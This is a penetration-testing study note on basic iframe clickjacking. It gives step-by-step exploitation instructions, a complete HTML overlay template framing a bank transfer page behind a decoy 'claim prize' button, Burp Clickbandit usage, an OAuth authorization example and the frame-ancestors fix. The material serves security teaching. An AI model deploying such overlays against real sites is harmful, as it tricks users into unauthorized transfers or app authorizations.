---
tags: [vapt, clickjacking, ui, intermediate]
difficulty: intermediate
module: "28 - Clickjacking"
topic: "28.02 Basic iframe Clickjacking"
---

# 28.02 — Basic iframe Clickjacking

## What is it?
**Basic iframe Clickjacking** is the practical execution of UI Redressing. It involves crafting an HTML payload that uses CSS absolute positioning, Z-indexing, and opacity controls to overlay a vulnerable target page over a decoy page. 

The goal is to align a specific, dangerous button on the target application (like "Delete Account") perfectly beneath a harmless-looking button on the attacker's page (like "Play Game"). 

Because different browsers, screen resolutions, and operating systems render web pages slightly differently, precise alignment is the hardest part of building a working Clickjacking exploit.

Think of it like a sniper calculating wind and distance. If the sniper (attacker) doesn't perfectly calculate the exact pixel coordinates, the target (victim's cursor) will miss the critical button, and the attack will fail or the victim will click harmless whitespace.

## ASCII Diagram
```text
================================================================================
                    CSS POSITIONING FOR CLICKJACKING
================================================================================

[The Screen / Browser Window]

+-------------------------------------------------+
| [Decoy Text] WIN A FREE CAR!                    |
|                                                 |
|                                                 |
|                 [ CLICK TO WIN ]                | <-- Attacker's Button
|                                                 |
+-------------------------------------------------+
                          ^
                          | (Perfect Alignment)
                          v
        +-----------------------------------+
        | [Target iframe]                   |
        |                                   |
        |   Are you sure you want to        |
        |   delete your entire account?     |
        |                                   |
        |   [ DELETE EVERYTHING ]           | <-- Target Button
        +-----------------------------------+

[CSS Used to Achieve This]
iframe {
    position: absolute;   <-- Removes iframe from normal document flow
    top: -150px;          <-- Shifts iframe up so the target button aligns
    left: -50px;          <-- Shifts iframe left to align horizontally
    z-index: 2;           <-- Puts iframe on top
    opacity: 0.001;       <-- Makes iframe invisible (0.001 bypasses some weak defenses)
}
================================================================================
```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Identify a state-changing action on the target site (e.g., `https://bank.com/transfer?amount=1000&to=hacker`). The page should have a "Confirm Transfer" button and no framing protections (`X-Frame-Options`).
  2. Create an `exploit.html` file on your desktop.
  3. Set up the decoy background.
  4. Embed the target iframe.
  5. **The Calibration Phase:** Temporarily set the iframe `opacity` to `0.5` so you can see both layers simultaneously.
  6. Adjust the `top` and `left` CSS properties of the decoy button until it sits perfectly underneath the target button.
  7. **The Finalization Phase:** Set the iframe `opacity` to `0.0001`. (Note: Some modern browsers block clicks on elements with exactly `opacity: 0`, so a nearly invisible value is preferred).
  8. Host the HTML file and trick the victim into visiting it.

- **Actual payloads:**
  **The Universal Clickjacking Template:**
  ```html
  <!DOCTYPE html>
  <html>
  <head>
      <title>Win a Prize!</title>
      <style>
          /* The hidden target application */
          iframe {
              position: absolute;
              width: 800px;
              height: 600px;
              top: 0px;        /* ADJUST ME */
              left: 0px;       /* ADJUST ME */
              z-index: 2;
              opacity: 0.5;    /* Change to 0.0001 when finished calibrating */
          }
          
          /* The visible decoy button */
          .decoy-button {
              position: absolute;
              top: 250px;      /* Target button coordinates */
              left: 300px;     /* Target button coordinates */
              z-index: 1;
              padding: 15px 30px;
              font-size: 20px;
              background-color: red;
              color: white;
              cursor: pointer;
          }
      </style>
  </head>
  <body>
      <h1>Click the red button to claim your iPhone!</h1>
      <div class="decoy-button">CLAIM PRIZE!</div>
      
      <!-- The vulnerable target page containing the action -->
      <iframe src="https://vulnerable-bank.com/transfer/confirm"></iframe>
  </body>
  </html>
  ```

## Tools
- **Burp Suite Clickbandit:**
  Burp Suite Professional includes a built-in tool called Clickbandit that completely automates the CSS calibration process.
  1. Open Burp's browser. Go to `Burp -> Clickbandit`.
  2. Copy the Clickbandit Javascript payload.
  3. Navigate to the vulnerable target page in the browser.
  4. Open the Developer Console (F12) and paste the script.
  5. Clickbandit will overlay an interactive grid. You simply click the target button, and Clickbandit generates the perfect exploit HTML automatically!

## Real-World Example
An attacker found that a popular social media platform did not use `X-Frame-Options` on its "App Authorization" page (`https://social.com/oauth/authorize?client_id=EVIL_APP`). When a user visited this URL, they were presented with an "Authorize App" button. The attacker created a personality quiz website. On the final page of the quiz, the user had to click "See My Results". The attacker placed the invisible iframe over this button. When the user clicked to see their quiz results, they unknowingly authorized the attacker's malicious OAuth app to read all their private messages.

## How to Fix It
- **Developer remediation:**
  Implement the `Content-Security-Policy: frame-ancestors 'none'` HTTP response header on all state-changing endpoints to completely prevent the browser from rendering the page inside any iframe.

## Chaining Opportunities
- This vuln + [[03 - Multistep Clickjacking]] → When the action requires multiple clicks (e.g., clicking a dropdown menu, then clicking "Delete").
- This vuln + [[03 - OAuth Misconfigurations (Implicit Flow)]] → Forcing victim to authorize malicious OAuth applications.

## Related Notes
- [[01 - What is Clickjacking?]]
- [[05 - Clickjacking + CSRF Chain]]
